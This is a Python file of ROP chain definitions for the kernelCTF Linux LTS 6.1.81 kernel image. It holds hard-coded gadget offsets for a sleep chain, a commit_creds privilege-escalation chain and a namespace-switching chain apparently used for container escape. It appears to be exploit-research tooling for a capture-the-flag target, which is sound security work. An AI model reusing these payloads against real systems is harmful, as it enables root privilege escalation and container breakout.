from rop_chain import *

class RopActions_For_Lts_6_1_81:
    """RopAction samples generated for kernel-image-db/releases/kernelctf/lts-6.1.81/vmlinux"""

    sleep = RopChain(items=[
        RopChainOffset(kernel_offset=0x21f5),
        RopChainArgument(argument_index=0),
        RopChainOffset(kernel_offset=0x227a50)])

    commit_creds = RopChain(items=[
        RopChainOffset(kernel_offset=0x21f5),
        RopChainConstant(0),
        RopChainOffset(kernel_offset=0x1be800),
        RopChainOffset(kernel_offset=0x17caa80),
        RopChainOffset(kernel_offset=0x1be550)])

    switch_namespaces = RopChain(items=[
        RopChainOffset(kernel_offset=0x21f5),
        RopChainConstant(1),
        RopChainOffset(kernel_offset=0x1b4f20),
        RopChainOffset(kernel_offset=0x17caa80),
        RopChainOffset(kernel_offset=0x30cd),
        RopChainOffset(kernel_offset=0x2876880),
        RopChainOffset(kernel_offset=0x1bc9b0)])

    by_well_known_ids = {
        0x01: sleep,
        0x02: commit_creds,
        0x03: switch_namespaces,
    }
